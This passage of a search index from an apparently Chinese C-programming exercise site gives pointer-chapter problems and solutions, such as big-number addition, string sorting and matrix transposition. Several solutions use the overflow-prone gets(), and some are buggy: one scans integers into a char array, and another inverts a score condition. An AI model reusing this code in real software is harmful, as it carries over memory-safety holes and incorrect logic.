/*\u5219\u4ea4\u6362\u8fd9\u4e24\u4e2a\u5b57\u7b26*/\n                s[i]=s[j];\n                s[j]=t;\n            }\n}\nint main() {\n    int i;\n    char s[81];\n    printf(\"\u8bf7\u8f93\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32:\");\n    gets(s);\n    i=strlen(s);\n    fun(s,i);\n    printf(\"\u6392\u5e8f\u540e\u7684\u5b57\u7b26\u4e32\u662f:%s\\n\",s);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#26","title":"26","text":"<p>**\u4f7f\u7528\u6307\u9488\u6cd5\u5b8c\u6210\u4e24\u4e2a\u8d85\u957f\u6b63\u6574\u6570\u7684\u52a0\u6cd5 **</p> <p>\u4f7f\u7528\u6307\u9488\u6cd5\u5b8c\u6210\u4e24\u4e2a\u8d85\u957f\uff08\u598220\u4f4d\uff09\u6b63\u6574\u6570\u7684\u52a0\u6cd5\u3002</p> C<pre><code>#include \"stdio.h\"\nvoid fun1(int *p1,int *q1,int i,int j) { //\u628a\u6700\u4f4e\u4f4d\u5bf9\u9f50\n    int t,*p2=p1+i,*q2=q1+j;\n    if(i&gt;j) {   //b[]\u77ed\n        t=i-j;\n        while(q2&gt;=q1) {\n            *(q2+t)=*q2;\n            q2--;\n        }\n        for(; t&gt;=0; t--)        //\u9ad8\u4f4d\u90e8\u5206\u6e050\n            *q1++=0;\n    }\n    if(i&lt;j) {   //a[]\u77ed\n        t=j-i;\n        while(p2&gt;=p1) {\n            *(p2+t)=*p2;\n            p2--;\n        }\n        for(; t&gt;=0; t--)        //\u9ad8\u4f4d\u90e8\u5206\u6e050\n            *p1++=0;\n    }\n}\nvoid add(int *p1,int *q1,int i) {\n    int c=0,*p2,*q2,t;  //c\u8fdb\u4f4d\u6807\u5fd7\n    p2=p1+i-1;\n    q2=q1+i-1;\n    while(p2&gt;=p1) {\n        t=((*p2)+(*q2)+c)%10;   //\u4e2a\u4f4d\n        c=((*p2)+(*q2)+c)/10;   //\u8fdb\u4f4d\n        *p2=t;\n        p2--;\n        q2--;\n    }\n    *p2=c;\n}\nint main() {\n    int a[201]= {0},b[201]= {0},*p1=a,*q1=b,i=0,j=0;\n    printf(\"\u8bf7\u8f93\u5165\u7b2c\u4e00\u4e2a\u6b63\u6574\u6570:\");\n    do {    //a[0]=0,\u53ef\u5b58\u6700\u540e\u7684\u8fdb\u4f4d\n        *(p1+(++i))=getchar()-'0'; // \\n-'0'=-38\n    } while(*(p1+i)!=-38);\n    printf(\"\u8bf7\u8f93\u5165\u7b2c\u4e8c\u4e2a\u6b63\u6574\u6570:\");\n    do {\n        *(q1+(++j))=getchar()-'0';\n    } while(*(q1+j)!=-38);\n    fun1(a,b,i,j);      //\u628a\u6700\u4f4e\u4f4d\u5bf9\u9f50\n    if(i&lt;j)\n        i=j;        //i\uff1d\u957f\u6570\u7684\u4e2a\u6570\n    add(a,b,i);\n    printf(\"\u548c\u4e3a\uff1a\");\n    for(; i&gt;0; i--)\n        printf(\"%d\",*p1++);\n    printf(\"\\n\");\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#27","title":"27","text":"<p>\u8f93\u5165\u5b57\u7b26\u4e32s\u548ct\uff0c\u68c0\u67e5\u5b57\u7b26\u4e32s\u4e2d\u662f\u5426\u5305\u542b\u5b57\u7b26\u4e32t</p> <p>\u8f93\u5165\u5b57\u7b26\u4e32s\u548ct\uff0c\u68c0\u67e5\u5b57\u7b26\u4e32s\u4e2d\u662f\u5426\u5305\u542b\u5b57\u7b26\u4e32t\uff0c\u82e5\u5305\u542b\uff0c\u5219\u8fd4\u56det\u5728s\u4e2d\u7684\u5f00\u59cb\u4f4d\u7f6e\uff08\u4f4d\u7f6e\u503c\u4ece0\u5f00\u59cb\u8ba1\u7b97\uff09\uff0c\u5426\u5219\u9001\u56de-1\u3002\u8981\u6c42\u7528\u6307\u9488\u65b9\u5f0f\u5b9e\u73b0\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\nindex(char *s, char *t) {\n    char *p,*h=s,*tmp=t;\n    for(; *s; s++ ) {\n        for(p=s; *t &amp;&amp; *t==*p; p++,t++)\n            ;\n        if(!(*t))\n            return (s-h);\n        else\n            t=tmp;\n    }\n    return(-1);\n}\nint main() {\n    int n;\n    char s[81],t[81];\n    printf(\"\u8bf7\u8f93\u5165\u5b57\u7b26\u4e32s\uff1a\");\n    gets(s);\n    printf(\"\u8bf7\u8f93\u5165\u5b57\u7b26\u4e32t\uff1a\");\n    gets(t);\n    n=index(s,t);\n    printf(\"%d\\n\",n);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#28","title":"28","text":"<p>\u7528\u6307\u9488\u6cd5\u5c06\u5b57\u7b26\u4e32\u4e2d\u6307\u5b9a\u7684\u5b57\u7b26\u5220\u9664\u3002</p> <p>\u7528\u6307\u9488\u6cd5\u5c06\u5b57\u7b26\u4e32\u4e2d\u6307\u5b9a\u7684\u5b57\u7b26\u5220\u9664\u3002</p> C<pre><code>#include \"stdio.h\"\nvoid del( char *s,char c ) {\n    char *p=s;\n    for(; *s; s++)\n        if(*s!=c)\n            *p++=*s;\n    *p='\\0';\n}\nint main() {\n    char a[81],c;\n    printf(\"\u8bf7\u8f93\u5165\u5b57\u7b26\u4e32\uff1a\");\n    gets(a);\n    printf(\"\u8bf7\u8f93\u5165\u8981\u5220\u9664\u7684\u5b57\u7b26\uff1a\");\n    c=getchar();\n    del(a,c);\n    puts(a);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#29","title":"29","text":"<p>\u6307\u5411\u6307\u9488\u7684\u6307\u9488\u5bf9\u6574\u6570\u6392\u5e8f</p> <p>\u7528\u6307\u5411\u6307\u9488\u7684\u6307\u9488\u7684\u65b9\u6cd5\u5bf9 n \u4e2a\u6574\u6570\u6392\u5e8f\u5e76\u8f93\u51fa\u3002\u8981\u6c42\u5c06\u6392\u5e8f\u5355\u72ec\u5199\u6210\u4e00\u4e2a\u51fd\u6570\u3002n \u4e2a\u6574\u6570\u5728\u4e3b\u51fd\u6570\u4e2d\u8f93\u5165\uff0c\u6700\u540e\u5728\u4e3b\u51fd\u6570\u4e2d\u8f93\u51fa\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\nvoid sort (int **p, int n) {\n    int i, j, *temp;\n    for (i = 0; i &lt; n - 1; i++) {\n        for (j = i + 1; j &lt; n; j++) {\n            if (**(p + i) &gt; **(p + j)) {\n                temp = *(p + i);\n                *(p + i) = *(p + j);\n                *(p + j) = temp;\n            }\n        }\n    }\n}\n\nint main () {\n    int i, n, data[20], **p, *pstr[20];\n    scanf(\"%d\", &amp;n);\n    for (i = 0; i &lt; n; i++)\n        pstr[i] = &amp;data[i];\n    for (i = 0; i &lt; n; i++)\n        scanf(\"%d\", pstr[i]);\n    p = pstr;\n    sort(p, n);\n    for (i = 0; i &lt; n; i++)\n        printf(\"%d  \", *pstr[i]);\n    printf(\"\\n\");\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#30","title":"30","text":"<p>\u6307\u5411\u6307\u9488\u7684\u6307\u9488\u5bf9\u5b57\u7b26\u4e32\u6392\u5e8f</p> <p>\u7528\u6307\u5411\u6307\u9488\u7684\u6307\u9488\u7684\u65b9\u6cd5\u5bf9 5 \u4e2a\u5b57\u7b26\u4e32\u6392\u5e8f\u5e76\u8f93\u51fa\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#define LINEMAX 20\n\nvoid sort (char **p) {\n    int i, j;\n    char *temp;\n    for (i = 0; i &lt; 5; i++) {\n        for (j = i + 1; j &lt; 5; j++) {\n            if (strcmp(*(p + i), *(p + j)) &gt; 0) {\n                temp = *(p + i);\n                *(p + i) = *(p + j);\n                *(p + j) = temp;\n            }\n        }\n    }\n}\n\nint main () {\n    int i;\n    char **p, *pstr[5], str[5][LINEMAX];\n    for (i = 0; i &lt; 5; i++)\n        pstr[i] = str[i];\n    for (i = 0; i &lt; 5; i++)\n        scanf(\"%s\", pstr[i]);\n    p = pstr;\n    sort(p);\n    for (i = 0; i &lt; 5; i++)\n        printf(\"%s\\n\", pstr[i]);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#31","title":"31","text":"<p>\u6bd4\u8f83\u4e24\u4e2a\u5b57\u7b26\u4e32</p> <p>\u4ece\u952e\u76d8\u8f93\u5165\u4e24\u4e2a\u5b57\u7b26\u4e32 s1\u3001s2\uff0c\u5b9e\u73b0\u4e24\u4e2a\u5b57\u7b26\u4e32\u7684\u6bd4\u8f83\u3002</p> <ul> <li>\u7f16\u5199\u4e00\u4e2a strcmp \u51fd\u6570\u5b9e\u73b0\u4e24\u4e2a\u5b57\u7b26\u4e32\u7684\u6bd4\u8f83\uff0c\u51fd\u6570\u539f\u578b\u4e3a<code>strcmp(char *p1, char *p2)</code>\uff0c</li> <li>\u8bbe p1 \u6307\u5411\u5b57\u7b26\u4e32 s1\uff0cp2 \u6307\u5411\u5b57\u7b26\u4e32 s2\u3002</li> <li>\u8981\u6c42\u5f53 s1 = s2 \u65f6\uff0c\u8fd4\u56de\u503c\u4e3a 0\uff1b</li> <li>\u5f53 s1 \u2260 s2 \u65f6\uff0c\u8fd4\u56de\u5b83\u4eec\u4e8c\u8005\u7b2c 1 \u4e2a\u4e0d\u540c\u5b57\u7b26\u7684 ASCII \u7801\u5dee\u503c(\u5982\"BOY\"\u4e0e\"BAD\"\uff0c\u7b2c 2 \u4e2a\u5b57\u6bcd\u4e0d\u540c\uff0c\"O\"\u4e0e\"A\"\u4e4b\u5dee\u4e3a 79 - 65 = 14)\uff1b</li> <li>\u5f53 s1 &gt; s2 \u65f6\uff0c\u5219\u8f93\u51fa\u6b63\u503c\uff1b</li> <li>\u5f53 s1 &lt; s2 \u65f6\uff0c\u5219\u8f93\u51fa\u8d1f\u503c\u3002</li> </ul> <p>\u8f93\u5165\u793a\u4f8b</p> Text Only<pre><code>CHINA\nChen\n</code></pre> <p>\u8f93\u51fa\u793a\u4f8b</p> Text Only<pre><code>result: -32\n</code></pre> C<pre><code>#include &lt;stdio.h&gt;\nint strcmp (char *p1, char *p2) {\n    int i;\n    i = 0;\n    while (*(p1 + i) == *(p2 + i))\n        if (*(p1 + i++) == '\\0')\n            return 0;\n    return *(p1 + i) - *(p2 + i);\n}\n\nint main () {\n    int m;\n    char str1[20], str2[20];\n    gets(str1);\n    gets(str2);\n    m = strcmp(str1, str2);\n    printf(\"result: %d\\n\", m);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#32","title":"32","text":"<p>**\u7edf\u8ba1\u5b57\u7b26\u4e32\u5185\u6570\u5b57\u548c\u975e\u6570\u5b57  **</p> <p>\u8f93\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5185\u6709\u6570\u5b57\u548c\u975e\u6570\u5b57\u5b57\u7b26\uff0c\u4f8b\u5982<code>A123x456 17960? 302tab5976</code>\uff0c\u5c06\u5176\u4e2d\u8fde\u7eed\u7684\u6570\u5b57\u4f5c\u4e3a\u4e00\u4e2a\u6574\u6570\uff0c\u4f9d\u6b21\u5b58\u653e\u5230\u4e00\u6570\u7ec4 a \u4e2d\u3002\u4f8b\u5982\uff0c123 \u653e\u5728 a[0]\uff0c456 \u653e\u5728 a[1]\u2026\u3002\u7edf\u8ba1\u5171\u6709\u591a\u5c11\u4e2a\u6574\u6570\uff0c\u5e76\u8f93\u51fa\u8fd9\u4e9b\u6570\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\nint main () {\n    char str[50], *pstr;\n    int i, j, k, m, e10, digit, ndigit, a[10], *pa;\n    gets(str);\n    pstr = &amp;str[0];\n    pa = &amp;a[0];\n    ndigit = 0;\n    i = 0;\n    j = 0;\n    while (*(pstr + i) != '\\0') {\n        if ((*(pstr + i) &gt;= '0') &amp;&amp; (*(pstr + i) &lt;= '9'))\n            j++;\n        else {\n            if (j &gt; 0) {\n                digit = *(pstr + i - 1) - 48;\n                k = 1;\n                while (k &lt; j) {\n                    e10 = 1;\n                    for (m = 1; m &lt;= k; m++)\n                        e10 = e10 * 10;\n                    digit = digit + (*(pstr + i - 1 - k) - 48) * e10;\n                    k++;\n                }\n                *pa = digit;\n                ndigit++;\n                pa++;\n                j = 0;\n            }\n        }\n        i++;\n    }\n    if (j &gt; 0) {\n        digit = *(pstr + i - 1) - 48;\n        k = 1;\n        while (k &lt; j) {\n            e10 = 1;\n            for (m = 1; m &lt;= k; m++)\n                e10 = e10 * 10;\n            digit = digit + (*(pstr + i - 1 - k) - 48) * e10;\n            k++;\n        }\n        *pa = digit;\n        ndigit++;\n        j = 0;\n    }\n    printf(\"There are %d numbers in this line, they are: \\n\", ndigit);\n    j = 0;\n    pa = &amp;a[0];\n    for (j = 0; j &lt; ndigit; j++)\n        printf(\"%d \", *(pa + j));\n    printf(\"\\n\");\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#33","title":"33","text":"<p>\u8bfe\u7a0b\u7684\u76f8\u5173\u7edf\u8ba1</p> <p>\u6709\u4e00\u4e2a\u73ed 4 \u4e2a\u5b66\u751f\uff0c5 \u95e8\u8bfe\u7a0b\u3002</p> <p>\u2460 \u6c42\u7b2c 1 \u95e8\u8bfe\u7a0b\u7684\u5e73\u5747\u5206\uff1b</p> <p>\u2461 \u627e\u51fa\u6709\u4e24\u95e8\u4ee5\u4e0a\u8bfe\u7a0b\u4e0d\u53ca\u683c\u7684\u5b66\u751f\uff0c\u8f93\u51fa\u4ed6\u4eec\u7684\u5b66\u53f7\u548c\u5168\u90e8\u8bfe\u7a0b\u6210\u7ee9\u53ca\u5e73\u5747\u6210\u7ee9\uff1b</p> <p>\u2462 \u627e\u51fa\u5e73\u5747\u6210\u7ee9\u5728 90 \u5206\u4ee5\u4e0a\u6216\u5168\u90e8\u8bfe\u7a0b\u6210\u7ee9\u5728 85 \u5206\u4ee5\u4e0a\u7684\u5b66\u751f\u3002</p> <p>\u5206\u522b\u7f16 3 \u4e2a\u51fd\u6570\u5b9e\u73b0\u4ee5\u4e0a 3 \u4e2a\u8981\u6c42\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\nvoid avsco (double *pscore, double *paver) {\n    int i, j;\n    double sum, average;\n    for (i = 0; i &lt; 4; i++) {\n        sum = 0.0;\n        for (j = 0; j &lt; 5; j++)\n            sum = sum + (*(pscore + 5 * i + j));\n        average = sum / 5;\n        *(paver + i) = average;\n    }\n}\n\nvoid avcour1 (char(*pcourse)[10], double *pscore) {\n    int i;\n    float sum, average1;\n    sum = 0.0;\n    for (i = 0; i &lt; 4; i++)\n        sum = sum + (*(pscore + 5 * i));\n    average1 = sum / 4;\n    printf(\"course 1: %s average score: %7.2f\\n\", *pcourse, average1);\n}\n\nvoid fali2 (char course[5][10], int num[], double *pscore, double aver[4]) {\n    int i, j, k, labe1;\n    printf(\"No.\");\n    for (i = 0; i &lt; 5; i++)\n        printf(\"%10s\", course[i]);\n    printf(\"   average\\n\");\n    for (i = 0; i &lt; 4; i++) {\n        labe1 = 0;\n        for (j = 0; j &lt; 5; j++)\n            if (*(pscore + 5 * i + j) &lt; 60.0)\n                labe1++;\n        if (labe1 &gt;= 2) {\n            printf(\"%d\", num[i]);\n            for (k = 0; k &lt; 5; k++)\n                printf(\"%10.2f\", *(pscore + 5 * i + k));\n            printf(\"%10.2f\\n\", aver[i]);\n        }\n    }\n}\n\nvoid good (char course[5][10], int num[4], double *pscore, double aver[4]) {\n    int i, j, k, n;\n    printf(\"No.\");\n    for (i = 0; i &lt; 5; i++)\n        printf(\"%10s\", course[i]);\n    printf(\"   average\\n\");\n    for (i = 0; i &lt; 4; i++) {\n        n = 0;\n        for (j = 0; j &lt; 5; j++)\n            if (*(pscore + 5 * i + j) &gt; 85.0)\n                n++;\n        if ((n == 0) || (aver[i] &gt;= 90)) {\n            printf(\"%d\", num[i]);\n            for (k = 0; k &lt; 5; k++)\n                printf(\"%10.2f\", *(pscore + 5 * i + k));\n            printf(\"%10.2f\\n\", aver[i]);\n        }\n    }\n}\n\nint main () {\n    int i, j, *pnum, num[4];\n    double score[4][5], aver[4], *pscore, *paver;\n    char course[5][10], (*pcourse)[10];\n    pcourse = course;\n    for (i = 0; i &lt; 5; i++)\n        scanf(\"%s\", course[i]);\n    pscore = &amp;score[0][0];\n    pnum = &amp;num[0];\n    for (i = 0; i &lt; 4; i++) {\n        scanf(\"%d\", pnum + i);\n        for (j = 0; j &lt; 5; j++)\n            scanf(\"%lf\", pscore + 5 * i + j);\n    }\n    paver = &amp;aver[0];\n    avsco(pscore, paver);\n    avcour1(pcourse, pscore);\n    printf(\"\\n\");\n    fali2(pcourse, pnum, pscore, paver);\n    printf(\"\\n\");\n    good(pcourse, pnum, pscore, paver);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#34","title":"34","text":"<p>\u5c06\u591a\u4e2a\u6570\u9006\u5e8f\u6392\u5217</p> <p>\u5c06 n \u4e2a\u6570\u6309\u8f93\u5165\u65f6\u987a\u5e8f\u7684\u9006\u5e8f\u6392\u5217\uff0c\u7528\u51fd\u6570\u5b9e\u73b0\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\nvoid sort (char *p, int m) {\n    int i;\n    char temp, *p1, *p2;\n    for (i = 0; i &lt; m / 2; i++) {\n        p1 = p + i;\n        p2 = p + (m - 1 - i);\n        temp = *p1;\n        *p1 = *p2;\n        *p2 = temp;\n    }\n}\n\nint main () {\n    int i, n;\n    char *p, num[20];\n    scanf(\"%d\", &amp;n);\n    for (i = 0; i &lt; n; i++)\n        scanf(\"%d\", &amp;num[i]);\n    p = &amp;num[0];\n    sort(p, n);\n    for (i = 0; i &lt; n; i++)\n        printf(\"%d \", num[i]);\n    printf(\"\\n\");\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#35","title":"35","text":"<p>\u6c42\u5b9a\u79ef\u5206\u7684\u901a\u7528\u51fd\u6570</p> <p>\u5199\u4e00\u4e2a\u7528\u77e9\u5f62\u6cd5\u6c42\u5b9a\u79ef\u5206\u7684\u901a\u7528\u51fd\u6570\uff0c\u5206\u522b\u6c42</p> C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;math.h&gt;\n\ndouble integral (double (*p)(double), double a, double b, int n) {\n    int i;\n    double x, h, s;\n    h = (b - a) / n;\n    x = a;\n    s = 0;\n    for (i = 1; i &lt;= n; i++) {\n        x = x + h;\n        s = s + (*p)(x) * h;\n    }\n    return s;\n}\n\ndouble fsin (double x) {\n    return sin(x);\n}\n\ndouble fcos (double x) {\n    return cos(x);\n}\n\ndouble fexp (double x) {\n    return exp(x);\n}\n\nint main () {\n    double a1, a2, a3, b1, b2, b3, c, (*p)(double);\n    int n = 20;\n    scanf(\"%lf %lf\", &amp;a1, &amp;b1);\n    scanf(\"%lf %lf\", &amp;a2, &amp;b2);\n    scanf(\"%lf %lf\", &amp;a3, &amp;b3);\n    p = fsin;\n    c = integral(p, a1, b1, n);\n    printf(\"the integral of sin(x) is: %f\\n\", c);\n    p = fcos;\n    c = integral(p, a2, b2, n);\n    printf(\"the integral of cos(x) is: %f\\n\", c);\n    p = fexp;\n    c = integral(p, a3, b3, n);\n    printf(\"the integral of exp(x) is: %f\\n\", c);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#36","title":"36","text":"<p>\u7528\u6307\u9488\u5bf9\u5b57\u7b26\u4e32\u6392\u5e8f\u540e\u8f93\u51fa</p> <p>\u5728\u4e3b\u51fd\u6570\u4e2d\u8f93\u5165 10 \u4e2a\u4e0d\u7b49\u957f\u7684\u5b57\u7b26\u4e32\u4fdd\u5b58\u5230\u7528\u6307\u9488\u6570\u7ec4\u4e2d\u3002\u7528\u53e6\u4e00\u51fd\u6570\u5bf9\u5b83\u4eec\u6309\u4ece\u5c0f\u5230\u5927\u7684\u987a\u5e8f\u6392\u5e8f\u3002\u7136\u540e\u5728\u4e3b\u51fd\u6570\u8f93\u51fa\u8fd9 10 \u4e2a\u5df2\u6392\u597d\u5e8f\u7684\u5b57\u7b26\u4e32\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nvoid sort (char *s[]) {\n    int i, j;\n    char *temp;\n    for (i = 0; i &lt; 9; i++)\n        for (j = 0; j &lt; 9 - i; j++)\n            if (strcmp(*(s + j), *(s + j + 1)) &gt; 0) {\n                temp = *(s + j);\n                *(s + j) = *(s + j + 1);\n                *(s + j + 1) = temp;\n            }\n}\n\nint main () {\n    int i;\n    char *p[10], str[10][20];\n    for (i = 0; i &lt; 10; i++)\n        p[i] = str[i];\n    for (i = 0; i &lt; 10; i++)\n        scanf(\"%s\", p[i]);\n    sort(p);\n    for (i = 0; i &lt; 10; i++)\n        printf(\"%s\\n\", p[i]);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#37","title":"37","text":"<p>\u5bf9\u5b57\u7b26\u4e32\u6392\u5e8f\u540e\u8f93\u51fa</p> <p>\u5728\u4e3b\u51fd\u6570\u4e2d\u8f93\u5165 10 \u4e2a\u7b49\u957f\u7684\u5b57\u7b26\u4e32\u3002\u7528\u53e6\u4e00\u51fd\u6570\u5bf9\u5b83\u4eec\u6309\u4ece\u5c0f\u5230\u5927\u7684\u987a\u5e8f\u6392\u5e8f\u3002\u7136\u540e\u5728\u4e3b\u51fd\u6570\u8f93\u51fa\u8fd9 10 \u4e2a\u5df2\u6392\u597d\u5e8f\u7684\u5b57\u7b26\u4e32\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nvoid sort (char s[10][6]) {\n    int i, j;\n    char *p, temp[10];\n    p = temp;\n    for (i = 0; i &lt; 9; i++)\n        for (j = 0; j &lt; 9 - i; j++)\n            if (strcmp(s[j], s[j + 1]) &gt; 0) {\n                strcpy(p, s[j]);\n                strcpy(s[j], s[j + 1]);\n                strcpy(s[j + 1], p);\n            }\n}\n\nint main () {\n    int i;\n    char str[10][6];\n    for (i = 0; i &lt; 10; i++)\n        scanf(\"%s\", str[i]);\n    sort(str);\n    for (i = 0; i &lt; 10; i++)\n        printf(\"%s\\n\", str[i]);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#38","title":"38","text":"<p>\u8c03\u6574\u77e9\u9635\u5143\u7d20\u4f4d\u7f6e</p> <p>\u5c06\u4e00\u4e2a 5x5 \u7684\u77e9\u9635\u4e2d\u6700\u5927\u7684\u5143\u7d20\u653e\u5728\u4e2d\u5fc3\uff0c4 \u4e2a\u89d2\u5206\u522b\u653e 4 \u4e2a\u6700\u5c0f\u7684\u5143\u7d20(\u987a\u5e8f\u4e3a\u4ece\u5de6\u5230\u53f3\uff0c\u4ece\u4e0a\u5230\u4e0b\u4f9d\u6b21\u4ece\u5c0f\u5230\u5927\u5b58\u653e)\uff0c\u5199\u4e00\u51fd\u6570\u5b9e\u73b0\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\nvoid change (int *p) {\n    int i, j, temp;\n    int *pmax, *pmin;\n    pmax = p;\n    pmin = p;\n    for (i = 0; i &lt; 5; i++)\n        for (j = 0; j &lt; 5; j++) {\n            if (*pmax &lt; *(p + 5 * i + j))\n                pmax = p + 5 * i + j;\n            if (*pmin &gt; *(p + 5 * i + j))\n                pmin = p + 5 * i + j;\n        }\n    temp = *(p + 12);\n    *(p + 12) = *pmax;\n    *pmax = temp;\n    temp = *p;\n    *p = *pmin;\n    *pmin = temp;\n    pmin = p + 1;\n    for (i = 0; i &lt; 5; i++)\n        for (j = 0; j &lt; 5; j++)\n            if (((p + 5 * i + j) != p) &amp;&amp; (*pmin &gt; *(p + 5 * i + j)))\n                pmin = p + 5 * i + j;\n    temp = *pmin;\n    *pmin = *(p + 4);\n    *(p + 4) = temp;\n    pmin = p + 1;\n    for (i = 0; i &lt; 5; i++)\n        for (j = 0; j &lt; 5; j++)\n            if (((p + 5 * i + j) != (p + 4)) &amp;&amp; ((p + 5 * i + j) != p) &amp;&amp; (*pmin &gt; *(p + 5 * i + j)))\n                pmin = p + 5 * i + j;\n    temp = *pmin;\n    *pmin = *(p + 20);\n    *(p + 20) = temp;\n    pmin = p + 1;\n    for (i = 0; i &lt; 5; i++)\n        for (j = 0; j &lt; 5; j++)\n            if (((p + 5 * i + j) != p) &amp;&amp; ((p + 5 * i + j) != (p + 4)) &amp;&amp; ((p + 5 * i + j) != (p + 20)) &amp;&amp; (*pmin &gt; *(p + 5 * i + j)))\n                pmin = p + 5 * i + j;\n    temp = *pmin;\n    *pmin = *(p + 24);\n    *(p + 24) = temp;\n}\n\nint main () {\n    int a[5][5], *p, i, j;\n    for (i = 0; i &lt; 5; i++)\n        for (j = 0; j &lt; 5; j++)\n            scanf(\"%d\", &amp;a[i][j]);\n    p = &amp;a[0][0];\n    change(p);\n    for (i = 0; i &lt; 5; i++) {\n        for (j = 0; j &lt; 5; j++)\n            printf(\"%d \", a[i][j]);\n        printf(\"\\n\");\n    }\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#39","title":"39","text":"<p>\u6574\u578b\u77e9\u9635\u8f6c\u7f6e</p> <p>\u5199\u4e00\u4e2a\u51fd\u6570\uff0c\u5c06\u4e00\u4e2a 3x3 \u7684\u6574\u578b\u77e9\u9635\u8f6c\u7f6e\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\nvoid move (int *pointer) {\n    int i, j, t;\n    for (i = 0; i &lt; 3; i++)\n        for (j = i; j &lt; 3; j++) {\n            t = *(pointer + 3 * i + j);\n            *(pointer + 3 * i + j) = *(pointer + 3 * j + i);\n            *(pointer + 3 * j + i) = t;\n        }\n}\n\nint main () {\n    int a[3][3], *p, i;\n    for (i = 0; i &lt; 3; i++)\n        scanf(\"%d %d %d\", &amp;a[i][0], &amp;a[i][1], &amp;a[i][2]);\n    p = &amp;a[0][0];\n    move(p);\n    for (i = 0; i &lt; 3; i++)\n        printf(\"%d %d %d\\n\", a[i][0], a[i][1], a[i][2]);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#40","title":"40","text":"<p>\u62a5\u6570\u9000\u51fa</p> <p>\u7531 n \u4e2a\u4eba\u56f4\u6210\u4e00\u5708\uff0c\u987a\u5e8f\u6392\u53f7\u3002\u4ece\u7b2c\u4e00\u4e2a\u4eba\u5f00\u59cb\u62a5\u6570(\u4ece 1 \u5230 3 \u62a5\u6570)\uff0c\u51e1\u62a5\u5230 3 \u7684\u4eba\u9000\u51fa\u5708\u5b50\uff0c\u95ee\u6700\u540e\u7559\u4e0b\u7684\u662f\u539f\u6765\u7b2c\u51e0\u53f7\u7684\u90a3\u4f4d\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\nint main () {\n    int i, k, m, n, num[50], *p;\n    scanf(\"%d\", &amp;n);\n    p = num;\n    for (i = 0; i &lt; n; i++)\n        *(p + i) = i + 1;\n    i = 0;\n    k = 0;\n    m = 0;\n    while (m &lt; n - 1) {\n        if (*(p + i) != 0)\n            k++;\n        if (k == 3) {\n            *(p + i) = 0;\n            k = 0;\n            m++;\n        }\n        i++;\n        if (i == n)\n            i = 0;\n    }\n    while (*p == 0)\n        p++;\n    printf(\"%d\\n\", *p);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#41","title":"41","text":"<p>\u79fb\u52a8\u6570\u7ec4\u4e2d\u7684\u591a\u4e2a\u6570\u5b57</p> <p>\u8f93\u5165\u7531 n \u4e2a\u6574\u6570\u7ec4\u6210\u7684\u6570\u7ec4\uff0c\u4f7f\u7528\u6307\u9488\u53d8\u91cf\u5c06\u5176\u4e2d\u524d\u9762\u5404\u6570\u987a\u5e8f\u5411\u540e\u79fb m \u4e2a\u4f4d\u7f6e\uff0c\u6700\u540e m \u4e2a\u6570\u53d8\u6210\u6700\u524d\u9762 m \u4e2a\u6570\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\nvoid move (int array[20], int n, int m) {\n    int *p, array_end;\n    array_end = *(array + n - 1);\n    for (p = array + n - 1; p &gt; array; p--)\n        *p = *(p - 1);\n    *array = array_end;\n    m--;\n    if (m &gt; 0)\n        move(array, n, m);\n}\n\nint main () {\n    int number[20], n, m, i;\n    scanf(\"%d\", &amp;n);\n    for (i = 0; i &lt; n; i++)\n        scanf(\"%d\", &amp;number[i]);\n    scanf(\"%d\", &amp;m);\n    move(number, n, m);\n    for (i = 0; i &lt; n; i++)\n        printf(\"%d \", number[i]);\n    printf(\"\\n\");\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#42","title":"42","text":"<p>\u79fb\u52a8\u6570\u7ec4\u4e2d\u7684\u6570\u5b57</p> <p>\u8f93\u5165\u7531 10 \u4e2a\u6574\u6570\u7ec4\u6210\u7684\u6570\u7ec4\uff0c\u4f7f\u7528\u6307\u9488\u53d8\u91cf\u5c06\u5176\u4e2d\u6700\u5c0f\u7684\u6570\u4e0e\u7b2c 1 